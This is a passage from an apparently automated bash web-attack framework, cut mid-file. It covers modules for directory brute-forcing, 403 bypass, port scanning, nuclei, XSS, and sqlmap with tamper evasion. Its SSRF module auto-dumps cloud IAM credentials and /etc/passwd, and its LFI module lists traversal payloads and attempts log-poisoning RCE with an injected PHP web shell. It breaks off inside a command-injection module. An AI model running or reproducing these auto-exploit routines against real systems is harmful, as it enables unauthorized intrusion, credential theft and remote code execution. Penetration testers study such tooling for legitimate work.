            resp_code=$(_curl -X POST -H "Content-Type: application/json" -d "$payload" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
            body=$(_curl -X POST -H "Content-Type: application/json" -d "$payload" "$url" 2>/dev/null | head -c 2000 || true)
            if [[ "$resp_code" =~ ^(200|201)$ ]] || echo "$body" | grep -qiE "(admin|true|success|token|privilege|elevated|granted)"; then
                uniq_add "$O/json_xml/json_hits.txt" "JSON_MUTATION [${label}] [${resp_code}]: $url"
                log_warn "JSON mutation hit [$label]: $url"
            fi
            if echo "$body" | grep -qiE "(error|exception|stack|trace|syntax)" && [[ "$resp_code" == "500" ]]; then
                uniq_add "$O/json_xml/json_500.txt" "JSON_500 [${label}] [${resp_code}]: $url"
            fi
        done
    done < <(head -50 "$API_URLS" 2>/dev/null)
    sort -u -o "$O/json_xml/json_hits.txt" "$O/json_xml/json_hits.txt" 2>/dev/null || true
    sort -u -o "$O/json_xml/json_500.txt" "$O/json_xml/json_500.txt" 2>/dev/null || true
    log_ok "JSON mutation hits: $(cnt "$O/json_xml/json_hits.txt")"
    log_ok "Parameter mutation fuzzing complete → $O/"
}

# ── MODULE 05 — PATHS & ENDPOINTS ───────────────────────────────────────
mod_paths() {
    progress "MODULE 05 — Path & Endpoint Discovery"
    log_section "MODULE 05 — PATH & ENDPOINT DISCOVERY"
    local O="$WORKSPACE/paths"
    local EP="$WORKSPACE/endpoints"
    mkdir -p "$EP"
    local WL_COMMON WL_RAFT WL_API WL_MED WL_FILES
    WL_COMMON=$(pick_wl /usr/share/wordlists/dirb/common.txt "$HOME/tools/wordlists/common.txt")
    WL_RAFT=$(pick_wl /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
        "$HOME/tools/wordlists/raft-large-words.txt" "$WL_COMMON")
    WL_API=$(pick_wl /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
        "$HOME/tools/wordlists/api-endpoints.txt" "$WL_COMMON")
    WL_MED=$(pick_wl /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
        "$HOME/tools/wordlists/directory-list-2.3-medium.txt" "$WL_COMMON")
    WL_FILES=$(pick_wl /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt \
        "$HOME/tools/wordlists/raft-small-files.txt" "$WL_COMMON")
    [[ -n "$CUSTOM_WL" && -f "$CUSTOM_WL" ]] && WL_RAFT="$CUSTOM_WL"
    local MAIN="https://$DOMAIN"
    log_info "ffuf directory bruteforce (top 20 hosts, threads: $T_FFUF)..."
    head -20 "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null | while IFS= read -r target; do
        local s; s=$(safe_name "$target")
        _ffuf -u "${target}/FUZZ" -w "$WL_RAFT" -t "$T_FFUF" \
            -mc 200,201,204,301,302,307,401,403,405,500 \
            -of json -o "$O/ffuf_${s}.json" -s 2>/dev/null || true
    done
    log_ok "ffuf complete"
    log_info "feroxbuster recursive scan (depth 4)..."
    _ffuf -u "${MAIN}/FUZZ" -w "$WL_MED" -t "$T_FFUF" -mc 200,204,301,302,307,401,403,405 \
        -of json -o "$O/ferox_main.json" -s 2>/dev/null \
        || feroxbuster --url "$MAIN" --wordlist "$WL_MED" --threads 50 --depth 4 \
            --status-codes 200,204,301,302,307,401,403,405 --auto-tune --collect-backups \
            --collect-extensions js,php,asp,aspx,jsp,json,yaml,yml,env,bak,old,txt,xml,conf \
            --output "$O/feroxbuster_main.txt" --quiet 2>/dev/null || true
    log_ok "feroxbuster complete"
    log_info "API endpoint discovery..."
    _ffuf -u "${MAIN}/FUZZ" -w "$WL_API" -t "$T_FFUF" -mc 200,201,204,301,302,401,403,405 \
        -of json -o "$O/ffuf_api.json" -s 2>/dev/null || true
    log_info "Backup & sensitive file check..."
    _ffuf -u "${MAIN}/FUZZ" -w "$WL_FILES" -t "$T_FFUF" -mc 200,301,302 \
        -of json -o "$O/ffuf_backups.json" -s 2>/dev/null || true
    cat "$O/ffuf_"*.json 2>/dev/null | jq -r '.results[]?.url' 2>/dev/null | sort -u > "$EP/ffuf_found.txt" || true
    grep -oE 'https?://[^ ]+' "$O/feroxbuster_main.txt" 2>/dev/null | sort -u > "$EP/feroxbuster_found.txt" || true
    log_info "403 bypass (16 path + header techniques)..."
    local bypass_out="$O/403_bypass.txt"
    while IFS= read -r url; do
        local path base
        path=$(echo "$url" | grep -oP "(?<=${DOMAIN}).*" || true)
        base=$(echo "$url" | grep -oP 'https?://[^/]+' || true)
        [[ -z "$path" || -z "$base" ]] && continue
        for trick in "${path}%2e" "/${path}" "//${path}" "${path}/." "${path}/.." "/%2f${path}" \
            "${path}%20" "${path}%09" "/.${path}" "${path}..;/" "/${path}?x" "${path}/./" "/${path}%3f" "${path}#" "/%2e${path}"; do
            local c; c=$(_curl -o /dev/null -w "%{http_code}" "${base}${trick}" 2>/dev/null || echo "000")
            [[ "$c" == "200" ]] && uniq_add "$bypass_out" "PATH_BYPASS [$c]: ${base}${trick}"
        done
        for hdr in "X-Original-URL: $path" "X-Rewrite-URL: $path" "X-Override-URL: $path" \
            "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Custom-IP-Authorization: 127.0.0.1" \
            "CF-Connecting-IP: 127.0.0.1" "X-Host: localhost" "Referer: ${base}${path}" "X-Forwarded-Host: localhost"; do
            local c; c=$(_curl -o /dev/null -w "%{http_code}" -H "$hdr" "$url" 2>/dev/null || echo "000")
            [[ "$c" == "200" ]] && uniq_add "$bypass_out" "HEADER_BYPASS [$c] ($hdr): $url"
        done
    done < "$WORKSPACE/paths/403_targets.txt" 2>/dev/null
    sort -u -o "$bypass_out" "$bypass_out" 2>/dev/null || true
    [[ -s "$bypass_out" ]] && log_hit "403 BYPASSES: $(cnt "$bypass_out") found!"
    log_info "Arjun hidden parameter discovery (top 50 endpoints)..."
    head -50 "$WORKSPACE/subdomains/status_200.txt" 2>/dev/null | while IFS= read -r url; do
        local s; s=$(safe_name "$url")
        arjun -u "$url" -oJ "$WORKSPACE/params/arjun_${s}.json" -t 20 -q 2>/dev/null || true
    done
    cat "$WORKSPACE/params/arjun_"*.json 2>/dev/null | jq -r '.params[]?' 2>/dev/null | sort -u \
        >> "$WORKSPACE/params/all_params.txt" || true
    sort -u -o "$WORKSPACE/params/all_params.txt" "$WORKSPACE/params/all_params.txt" 2>/dev/null || true
    cat "$EP/ffuf_found.txt" "$EP/feroxbuster_found.txt" \
        "$WORKSPACE/js/all_js_endpoints.txt" "$WORKSPACE/urls/katana.txt" 2>/dev/null | sort -u > "$EP/all_endpoints.txt"
    log_ok "Total discovered endpoints: $(cnt "$EP/all_endpoints.txt")"
    grep -iE "(admin|api/v[0-9]|graphql|swagger|actuator|debug|backup|config|secret|key|token|login|auth|dashboard|panel|manage|internal|dev|test|staging|upload|download|export|import|reset|forgot|webhook|payment|oauth|oidc|saml|sso|\.env|\.git|phpinfo|server-status|metrics|prometheus)" \
        "$EP/all_endpoints.txt" 2>/dev/null | sort -u > "$EP/interesting_paths.txt"
    log_ok "Interesting paths flagged: $(cnt "$EP/interesting_paths.txt")"
}

# ── MODULE 06 — PORTS ───────────────────────────────────────────────────
mod_ports() {
    [[ "$F_QUICK" == true ]] && return
    progress "MODULE 06 — Port Scan"
    log_section "MODULE 06 — NMAP PORT SCAN"
    local O="$WORKSPACE/subdomains"
    [[ ! -s "$O/resolved_domains.txt" ]] && { log_warn "No resolved hosts for port scan"; return; }
    log_info "nmap top-1000 on $(cnt "$O/resolved_domains.txt") hosts..."
    nmap -iL "$O/resolved_domains.txt" --top-ports 1000 -T4 --open \
        -sV --version-intensity 3 \
        -oN "$O/nmap_scan.txt" -oG "$O/nmap_grep.txt" 2>/dev/null || true
    log_ok "nmap complete → $O/nmap_scan.txt"
    grep "open" "$O/nmap_grep.txt" 2>/dev/null \
        | grep -E "(21|22|23|25|110|143|161|389|445|3306|5432|5900|6379|8080|8443|9200|11211|27017)" \
        | sort -u > "$O/interesting_ports.txt" || true
    [[ -s "$O/interesting_ports.txt" ]] && log_warn "Interesting ports: $(cnt "$O/interesting_ports.txt") (review $O/interesting_ports.txt)"
}

# ── MODULE 07 — SENSITIVE EXPOSURE ──────────────────────────────────────
mod_exposure() {
    progress "MODULE 07 — Sensitive File Exposure"
    log_section "MODULE 07 — SENSITIVE FILE & EXPOSURE CHECK"
    local O="$WORKSPACE/vulns/misconfig"
    local -a PATHS=(
        "/.env" "/.env.local" "/.env.production" "/.env.staging" "/.env.bak"
        "/.git/config" "/.git/HEAD" "/.git/COMMIT_EDITMSG"
        "/config.php" "/config.yml" "/config.yaml" "/config.json"
        "/wp-config.php" "/wp-config.php.bak" "/database.yml" "/database.json" "/db.json"
        "/docker-compose.yml" "/.dockerenv" "/Dockerfile" "/package.json" "/package-lock.json"
        "/composer.json" "/composer.lock" "/phpinfo.php" "/info.php" "/test.php"
        "/server-status" "/server-info" "/.htpasswd" "/.htaccess"
        "/actuator" "/actuator/env" "/actuator/beans" "/actuator/heapdump" "/actuator/mappings" "/actuator/logfile"
        "/metrics" "/health" "/status" "/debug" "/trace"
        "/api/swagger.json" "/swagger.json" "/api-docs" "/swagger-ui.html" "/openapi.json"
        "/.DS_Store" "/backup.sql" "/dump.sql" "/database.sql" "/backup.zip"
        "/crossdomain.xml" "/robots.txt" "/sitemap.xml" "/security.txt" "/.well-known/security.txt"
        "/.aws/credentials" "/credentials.json" "/.bash_history" "/web.config"
    )
    log_info "Checking ${#PATHS[@]} sensitive paths on top 15 live hosts..."
    while IFS= read -r base; do
        for path in "${PATHS[@]}"; do
            local url="${base}${path}"
            local code; code=$(_curl -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
            if [[ "$code" == "200" ]]; then
                local sz; sz=$(_curl -o /dev/null -w "%{size_download}" "$url" 2>/dev/null || echo "0")
                if [[ "$sz" -gt 10 ]] 2>/dev/null; then
                    uniq_add "$O/sensitive_files.txt" "EXPOSED [$code] [${sz}b]: $url"
                    log_hit "EXPOSED: $url (${sz} bytes)"
                fi
            fi
        done
    done < <(head -15 "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null)
    sort -u -o "$O/sensitive_files.txt" "$O/sensitive_files.txt" 2>/dev/null || true
    [[ -s "$O/sensitive_files.txt" ]] && log_hit "SENSITIVE FILES: $(cnt "$O/sensitive_files.txt") exposed!"
    log_ok "Exposure check complete"
}

# ── MODULE 08 — NUCLEI ──────────────────────────────────────────────────
mod_nuclei() {
    progress "MODULE 08 — Nuclei Vulnerability Scan"
    log_section "MODULE 08 — NUCLEI AUTOMATED VULNERABILITY SCAN"
    local O="$WORKSPACE/vulns/nuclei"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
    local PARAMS="$WORKSPACE/urls/urls_with_params.txt"
    mkdir -p "$O" 2>/dev/null || true
    touch "$O/nuclei_full.txt" "$O/nuclei_full.json" "$O/nuclei_critical_high.txt" \
          "$O/nuclei_params.txt" "$O/nuclei_cves.txt" "$O/nuclei_misconfig.txt" \
          "$O/nuclei_takeover.txt" 2>/dev/null || true
    log_info "Updating nuclei templates..."
    nuclei -update-templates -silent 2>/dev/null || true
    log_info "Nuclei FULL scan (threads: $T_NUCLEI, rate: $R_NUCLEI/s)..."
    _nuclei -list "$LIVE" -t "$HOME/nuclei-templates" \
        -severity critical,high,medium,low,info \
        -tags "cve,rce,sqli,xss,lfi,ssrf,idor,auth,misconfig,exposure,token,default-login,panel,backup,debug,takeover" \
        -c "$T_NUCLEI" -rate-limit "$R_NUCLEI" -timeout "$TIMEOUT_CONN" -retries 2 \
        -follow-redirects -stats -json-export "$O/nuclei_full.json" \
        -o "$O/nuclei_full.txt" 2>/dev/null || true
    sort -u -o "$O/nuclei_full.txt" "$O/nuclei_full.txt" 2>/dev/null || true
    log_ok "Nuclei full: $(cnt "$O/nuclei_full.txt") findings"
    jq -r 'select(.info.severity=="critical" or .info.severity=="high")
        | "[\(.info.severity|ascii_upcase)] [\(.info.name)] \(.host)"' \
        "$O/nuclei_full.json" 2>/dev/null | sort -u > "$O/nuclei_critical_high.txt" || true
    [[ -s "$O/nuclei_critical_high.txt" ]] && log_hit "NUCLEI Critical/High: $(cnt "$O/nuclei_critical_high.txt") findings!"
    log_info "Nuclei DAST on parameterized URLs..."
    _nuclei -list "$PARAMS" -t "$HOME/nuclei-templates/dast" -t "$HOME/nuclei-templates/vulnerabilities" \
        -c 30 -rate-limit 100 -json-export "$O/nuclei_params.json" \
        -o "$O/nuclei_params.txt" -silent 2>/dev/null || true
    sort -u -o "$O/nuclei_params.txt" "$O/nuclei_params.txt" 2>/dev/null || true
    log_info "CVE-targeted scan..."
    _nuclei -list "$LIVE" -tags cve -c "$T_NUCLEI" -rate-limit 100 \
        -json-export "$O/nuclei_cves.json" -o "$O/nuclei_cves.txt" -silent 2>/dev/null || true
    sort -u -o "$O/nuclei_cves.txt" "$O/nuclei_cves.txt" 2>/dev/null || true
    log_ok "CVE findings: $(cnt "$O/nuclei_cves.txt")"
    log_info "Misconfiguration scan..."
    _nuclei -list "$LIVE" -tags "misconfig,exposure,panel,default-login,backup,debug,config" \
        -c "$T_NUCLEI" -o "$O/nuclei_misconfig.txt" -silent 2>/dev/null || true
    sort -u -o "$O/nuclei_misconfig.txt" "$O/nuclei_misconfig.txt" 2>/dev/null || true
    log_ok "Misconfig findings: $(cnt "$O/nuclei_misconfig.txt")"
    log_info "Takeover check..."
    _nuclei -list "$LIVE" -tags takeover -o "$O/nuclei_takeover.txt" -silent 2>/dev/null || true
    sort -u -o "$O/nuclei_takeover.txt" "$O/nuclei_takeover.txt" 2>/dev/null || true
    [[ -s "$O/nuclei_takeover.txt" ]] && log_hit "Subdomain takeovers: $(cnt "$O/nuclei_takeover.txt")"
}

# ── MODULE 09 — XSS ─────────────────────────────────────────────────────
mod_xss() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 09 — XSS Detection"
    log_section "MODULE 09 — XSS (dalfox)"
    local O="$WORKSPACE/vulns/xss"
    mkdir -p "$O" 2>/dev/null || true
    touch "$O/dalfox_results.txt" "$O/no_csp.txt" "$O/csp_present.txt" 2>/dev/null || true
    local XSS_IN="$WORKSPACE/urls/gf/xss.txt"
    [[ ! -s "$XSS_IN" ]] && XSS_IN="$WORKSPACE/urls/urls_with_params.txt"
    active_filter "$XSS_IN" /tmp/dalfox_input_$$.txt 300
    local dalfox_count; dalfox_count=$(wc -l < /tmp/dalfox_input_$$.txt 2>/dev/null || echo 0)
    [[ "$dalfox_count" -gt 500 ]] && head -500 /tmp/dalfox_input_$$.txt > /tmp/dalfox_cap_$$.txt \
        && mv /tmp/dalfox_cap_$$.txt /tmp/dalfox_input_$$.txt
    log_info "dalfox (workers: $T_DALFOX, urls: $dalfox_count, timeout: 300s total)..."
    timeout 300 dalfox file "/tmp/dalfox_input_$$.txt" \
        --silence --skip-bav --no-color --worker "$T_DALFOX" --timeout 5 --delay 0 \
        --only-discovery ${SESSION_COOKIE:+--cookie "$SESSION_COOKIE"} ${PROXY_URL:+--proxy "$PROXY_URL"} \
        --output "$O/dalfox_results.txt" --format json 2>/dev/null || true
    rm -f /tmp/dalfox_input_$$.txt
    sort -u -o "$O/dalfox_results.txt" "$O/dalfox_results.txt" 2>/dev/null || true
    [[ -s "$O/dalfox_results.txt" ]] && log_hit "XSS: $(cnt "$O/dalfox_results.txt") hits!"
    log_info "CSP header check on live hosts..."
    while IFS= read -r url; do
        local csp; csp=$(_curl -I "$url" 2>/dev/null | grep -i "content-security-policy" | head -1)
        if [[ -z "$csp" ]]; then uniq_add "$O/no_csp.txt" "NO_CSP: $url"
        else uniq_add "$O/csp_present.txt" "$url | $csp"; fi
    done < "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null || true
    log_ok "No CSP: $(cnt "$O/no_csp.txt") hosts"
    log_ok "XSS scan complete"
}

# ── MODULE 10 — SQLi ────────────────────────────────────────────────────
mod_sqli() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 10 — SQLi Detection"
    log_section "MODULE 10 — SQL INJECTION (sqlmap)"
    local O="$WORKSPACE/vulns/sqli"
    mkdir -p "$O/sqlmap_active" 2>/dev/null || true
    local SQLI_IN="$WORKSPACE/urls/gf/sqli.txt"
    local PARAM_IN="$WORKSPACE/urls/urls_with_params.txt"
    log_info "SQLi: live-checking URLs to find active targets..."
    active_filter "$SQLI_IN"  "/tmp/sqli_gf_$$.txt"  30
    active_filter "$PARAM_IN" "/tmp/sqli_par_$$.txt" 20
    cat /tmp/sqli_gf_$$.txt /tmp/sqli_par_$$.txt 2>/dev/null | sort -u > /tmp/sqli_final_$$.txt
    local sqli_count; sqli_count=$(wc -l < /tmp/sqli_final_$$.txt 2>/dev/null || echo 0)
    if [[ "$sqli_count" -eq 0 ]]; then
        log_warn "No active SQLi targets found — skipping sqlmap"
        rm -f /tmp/sqli_gf_$$.txt /tmp/sqli_par_$$.txt /tmp/sqli_final_$$.txt
        return
    fi
    log_info "sqlmap on $sqli_count active URLs (timeout: 600s, fully automated)..."
    timeout 600 sqlmap -m "/tmp/sqli_final_$$.txt" \
        --batch --level=2 --risk=1 --random-agent --threads=5 --timeout=10 --retries=1 \
        --tamper=space2comment,between,randomcase --no-cast --smart \
        --skip=User-Agent,Referer,Host --ignore-code=403 \
        --answers="follow=N,sitemap=N,reduce=Y,store=N,normalize=Y,proceed=C,test=Y,try=Y,cookie=N,redirect=N,integer=Y" \
        ${SESSION_COOKIE:+--cookie="$SESSION_COOKIE"} ${PROXY_URL:+--proxy="$PROXY_URL"} \
        --output-dir="$O/sqlmap_active" 2>/dev/null || true
    rm -f /tmp/sqli_gf_$$.txt /tmp/sqli_par_$$.txt /tmp/sqli_final_$$.txt
    find "$O" -name "*.csv" -size +0c 2>/dev/null | while IFS= read -r f; do
        grep -v "^Target" "$f" | grep -v "^$" | while IFS= read -r line; do
            uniq_add "$O/sqli_findings.txt" "SQLi: $line"
            log_hit "SQLi: $line"
        done
    done
    log_ok "SQLi scan complete → $O/"
}

# ── MODULE 11 — SSRF ────────────────────────────────────────────────────
mod_ssrf() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 11 — SSRF"
    log_section "MODULE 11 — SSRF DETECTION + AUTO-EXPLOIT"
    local O="$WORKSPACE/vulns/ssrf"
    mkdir -p "$O/meta" 2>/dev/null || true
    local SSRF_IN="$WORKSPACE/urls/gf/ssrf.txt"
    [[ ! -s "$SSRF_IN" ]] && SSRF_IN="$WORKSPACE/urls/urls_with_params.txt"
    [[ ! -s "$SSRF_IN" ]] && SSRF_IN="$WORKSPACE/urls/urls_dynamic.txt"
    active_filter "$SSRF_IN" /tmp/ssrf_in_$$.txt 60
    local ssrf_total; ssrf_total=$(wc -l < /tmp/ssrf_in_$$.txt 2>/dev/null || echo 0)
    log_info "SSRF: testing $ssrf_total live URLs (in-band + OOB + time-based)"
    local -a SSRF_HOSTS=(
        "127.0.0.1" "localhost" "0.0.0.0" "::1" "[::1]"
        "2130706433" "0x7f000001" "0177.0.0.1" "127.1" "017700000001"
        "169.254.169.254" "0xA9FEA9FE" "2852039166"
        "10.0.0.1" "10.255.255.1" "172.16.0.1" "192.168.1.1"
    )
    local -a SSRF_PATHS=(
        "/latest/meta-data/" "/latest/meta-data/iam/security-credentials/"
        "/latest/meta-data/iam/security-credentials/admin"
        "/latest/user-data/" "/latest/dynamic/instance-identity/document"
        "/" "/robots.txt" "/server-status"
    )
    while IFS= read -r url; do
        local base="${url%%\?*}"
        local t0; t0=$(date +%s%N)
        local base_body; base_body=$(_curl "$url" 2>/dev/null | head -c 1500 || true)
        local t1; t1=$(date +%s%N)
        local base_ms=$(( (t1 - t0) / 1000000 ))
        local base_hash; base_hash=$(echo "$base_body" | md5sum | cut -d' ' -f1)
        for host in "${SSRF_HOSTS[@]}"; do
            for path in "${SSRF_PATHS[@]}"; do
                local payload="http://${host}${path}"
                local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
                [[ "$furl" == "$url" ]] && continue
                local body code sz
                body=$(_curl "$furl" 2>/dev/null | head -c 3000 || true)
                code=$(_curl -o /dev/null -w "%{http_code}" "$furl" 2>/dev/null || echo "000")
                sz=${#body}
                if echo "$body" | grep -qiE "(ami-id|instance-id|meta-data|security-credentials|AccessKeyId|SecretAccessKey|Token|accountId|availabilityZone)"; then
                    uniq_add "$O/ssrf_confirmed.txt" "SSRF_METADATA [${code}]: $furl"
                    log_hit "SSRF → CLOUD METADATA: $furl"
                    echo "$body" > "$O/meta/$(safe_name "$furl").body"
                    continue
                fi
                if echo "$body" | grep -qiE "(root:x:0:0|/bin/bash|uid=|/etc/passwd)"; then
                    uniq_add "$O/ssrf_confirmed.txt" "SSRF_FILE [${code}]: $furl"
                    log_hit "SSRF → FILE READ: $furl"
                    echo "$body" > "$O/meta/$(safe_name "$furl").body"
                    continue
                fi
                if echo "$body" | grep -qiE "(connection refused|no route to host|failed to connect|name or service not known|timed out|tcp|socket)"; then
                    uniq_add "$O/ssrf_error_oracle.txt" "SSRF_ORACLE [${code}] (${host}${path}): $furl"
                fi
                if [[ "$code" =~ ^(200|301|302)$ ]] && [[ "$sz" -gt 0 ]] && \
                   [[ "$(echo "$body" | md5sum | cut -d' ' -f1)" != "$base_hash" ]]; then
                    uniq_add "$O/ssrf_divergence.txt" "SSRF_DIVERGENCE [${code}] [${sz}b] (${host}${path}): $furl"
                fi
            done
        done
        local slow_furl; slow_furl=$(echo "$url" | qsreplace "http://10.255.255.1:81/" 2>/dev/null || true)
        local t2; t2=$(date +%s%N)
        _curl --connect-timeout 8 --max-time 12 "$slow_furl" >/dev/null 2>&1 || true
        local t3; t3=$(date +%s%N)
        local slow_ms=$(( (t3 - t2) / 1000000 ))
        if [[ "$slow_ms" -gt $(( base_ms + 3000 )) ]] && [[ "$slow_ms" -gt 4000 ]]; then
            uniq_add "$O/ssrf_timebased.txt" "SSRF_TIMEBASED [${slow_ms}ms vs base ${base_ms}ms]: $furl"
            log_warn "SSRF time-based candidate: $furl"
        fi
        if [[ -n "${INTERACTSH_DOMAIN:-}" ]]; then
            local rand; rand=$(head -c 6 /dev/urandom | xxd -p | head -1)
            local oob="http://${rand}.${INTERACTSH_DOMAIN}/"
            local oob_url; oob_url=$(echo "$url" | qsreplace "$oob" 2>/dev/null || true)
            _curl --max-time 6 "$oob_url" >/dev/null 2>&1 || true
            uniq_add "$O/oob_payloads_sent.txt" "OOB_SSRF [${rand}.${INTERACTSH_DOMAIN}]: $oob_url"
        fi
    done < /tmp/ssrf_in_$$.txt
    rm -f /tmp/ssrf_in_$$.txt
    if [[ -s "$O/ssrf_confirmed.txt" ]]; then
        log_hit "SSRF CONFIRMED: $(cnt "$O/ssrf_confirmed.txt") → auto-dumping metadata + /etc/passwd"
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' || true)
            [[ -z "$target" ]] && continue
            local meta; meta=$(echo "$target" | sed 's|http://[^/]*|http://169.254.169.254|')
            local dump
            dump=$(_curl "$meta/latest/meta-data/iam/security-credentials/" 2>/dev/null | head -c 4000 || true)
            [[ -n "$dump" ]] && { echo "### $target" >> "$O/iam_creds.txt"; echo "$dump" >> "$O/iam_creds.txt"; log_hit "IAM creds dumped for $target"; }
            local pfile; pfile=$(echo "$target" | sed 's|http://[^/]*|file:///etc/passwd|')
            local pb; pb=$(_curl "$pfile" 2>/dev/null | head -c 2000 || true)
            [[ -n "$pb" ]] && { echo "### $target" >> "$O/passwd_dump.txt"; echo "$pb" >> "$O/passwd_dump.txt"; log_hit "/etc/passwd dumped for $target"; }
        done < "$O/ssrf_confirmed.txt"
    fi

    sort -u -o "$O/ssrf_confirmed.txt"  "$O/ssrf_confirmed.txt"  2>/dev/null || true
    sort -u -o "$O/ssrf_divergence.txt" "$O/ssrf_divergence.txt" 2>/dev/null || true
    log_ok "SSRF confirmed: $(cnt "$O/ssrf_confirmed.txt") · candidates: $(cnt "$O/ssrf_divergence.txt")"
}

# ── MODULE 12 — LFI ────────────────────────────────────────────────────
mod_lfi() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 12 — LFI"
    log_section "MODULE 12 — LFI DETECTION + AUTO-EXPLOIT"
    local O="$WORKSPACE/vulns/lfi"
    mkdir -p "$O/decoded" 2>/dev/null || true
    local LFI_IN="$WORKSPACE/urls/gf/lfi.txt"
    [[ ! -s "$LFI_IN" ]] && LFI_IN="$WORKSPACE/urls/urls_with_params.txt"

    active_filter "$LFI_IN" /tmp/lfi_in_$$.txt 40
    local lfi_total; lfi_total=$(wc -l < /tmp/lfi_in_$$.txt 2>/dev/null || echo 0)
    log_info "LFI: testing $lfi_total live URLs"

    local -a LFI_PAYLOADS=(
        "../../../../../../etc/passwd"
        "../../../../../etc/passwd%00"
        "....//....//....//etc/passwd"
        "..%2f..%2f..%2f..%2f..%2fetc/passwd"
        "..%252f..%252f..%252fetc%252fpasswd"
        "/etc/passwd"
        "php://filter/convert.base64-encode/resource=/etc/passwd"
        "php://filter/read=convert.base64-encode/resource=/etc/passwd"
        "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
        "file:///etc/passwd"
        "php://filter/convert.base64-encode/resource=/proc/self/environ"
        "php://filter/convert.base64-encode/resource=index.php"
        "../../../../../../proc/self/environ"
        "../../../../../../var/log/apache2/access.log"
        "../../../../../../var/log/auth.log"
        "..\\..\\..\\..\\..\\windows\\win.ini"
        "....//....//....//windows/win.ini"
        "php://input"
        "data://text/plain;base64,PD9waHAgZWNobyAnbGZpcmNlX21hcmtlcic7ID8+"
    )

    while IFS= read -r url; do
        for payload in "${LFI_PAYLOADS[@]}"; do
            local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
            local body; body=$(_curl "$furl" 2>/dev/null | head -c 4000 || true)

            if echo "$body" | grep -qE "root:x:0:0|\[fonts\]|for 16-bit app support|\\[extensions\\]"; then
                uniq_add "$O/lfi_confirmed.txt" "LFI_CONFIRMED: $furl"
                log_hit "LFI: $furl"
                echo "$body" > "$O/decoded/$(safe_name "$furl").body"
                continue
            fi
            if echo "$body" | grep -qE '^[A-Za-z0-9+/]{40,}={0,2}$'; then
                local dec; dec=$(echo "$body" | tr -d '\n' | base64 -d 2>/dev/null || true)
                if echo "$dec" | grep -qE "root:x:0:0|/bin/bash|application|<\?php"; then
                    uniq_add "$O/lfi_confirmed.txt" "LFI_B64: $furl"
                    log_hit "LFI (base64 filter): $furl"
                    echo "### $furl" >> "$O/decoded/decoded_dump.txt"
                    echo "$dec" >> "$O/decoded/decoded_dump.txt"
                    echo "$dec" > "$O/decoded/$(safe_name "$furl").decoded"
                    continue
                fi
            fi
            if echo "$body" | grep -qiE "(failed to open stream|no such file|include\(|require\(|open_basedir|permission denied|path traversal)"; then
                uniq_add "$O/lfi_error_oracle.txt" "LFI_ORACLE: $furl"
            fi
        done
    done < /tmp/lfi_in_$$.txt
    rm -f /tmp/lfi_in_$$.txt

    # ── AUTO-EXPLOIT: log poisoning → RCE ──
    if [[ -s "$O/lfi_confirmed.txt" ]]; then
        log_hit "LFI CONFIRMED: $(cnt "$O/lfi_confirmed.txt") → attempting log-poison RCE"
        local marker; marker="lfirce$(head -c 4 /dev/urandom | xxd -p)"
        local phpcode="<?php echo '${marker}'; system(\$_GET['c']); ?>"
        while IFS= read -r line; do
            local target; target=$(echo "$line" | grep -oP 'https?://\S+$' || true)
            [[ -z "$target" ]] && continue
            for logf in \
                "../../../../../../var/log/auth.log" \
                "../../../../../../var/log/apache2/access.log" \
                "../../../../../../var/log/nginx/access.log" \
                "../../../../../../var/log/httpd/access_log" \
                "../../../../../../proc/self/environ"; do
                local inject_url; inject_url=$(echo "$target" | qsreplace "$logf" 2>/dev/null || true)
                _curl -A "$phpcode" --max-time 8 "$inject_url" >/dev/null 2>&1 || true
                local rce_url="${inject_url}%3Fc%3Did"
                local out; out=$(_curl -A "$phpcode" --max-time 8 "$rce_url" 2>/dev/null | head -c 2000 || true)
                if echo "$out" | grep -qE "uid=[0-9]+|${marker}"; then
                    uniq_add "$O/lfi_rce.txt" "LFI→RCE (log poison): ${inject_url}%3Fc%3D<cmd>"
                    log_hit "LFI→RCE via $logf: $(echo "$out" | head -2 | tr '\n' ' ')"
                    echo "### $target" >> "$O/rce_output.txt"
                    echo "$out" >> "$O/rce_output.txt"
                    break
                fi
            done
        done < "$O/lfi_confirmed.txt"
    fi

    sort -u -o "$O/lfi_confirmed.txt" "$O/lfi_confirmed.txt" 2>/dev/null || true
    sort -u -o "$O/lfi_rce.txt" "$O/lfi_rce.txt" 2>/dev/null || true
    log_ok "LFI confirmed: $(cnt "$O/lfi_confirmed.txt") · RCE: $(cnt "$O/lfi_rce.txt")"
}

# ── MODULE 13 — CMDi ───────────────────────────────────────────────────
mod_cmdi() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE 13 — Command Injection"
    log_section "MODULE 13 — COMMAND INJECTION (cmdi)"
    local O="$WORKSPACE/vulns/cmdi"
    mkdir -p "$O" 2>/dev/null || true
    local CMDI_IN="$WORKSPACE/urls/gf/cmdi.txt"
    [[ ! -s "$CMDI_IN" ]] && CMDI_IN="$WORKSPACE/urls/urls_with_params.txt"
    [[ ! -s "$CMDI_IN" ]] && { log_warn "No URL input for CMDi"; return; }

    active_filter "$CMDI_IN" /tmp/cmdi_in_$$.txt 40
    local cmdi_total; cmdi_total=$(wc -l < /tmp/cmdi_in_$$.txt 2>/dev/null || echo 0)
    log_info "CMDi: testing $cmdi_total live URLs"
    local rand_id; rand_id="cmdi$(head -c 6 /dev/urandom | xxd -p)"

    while IFS= read -r url; do
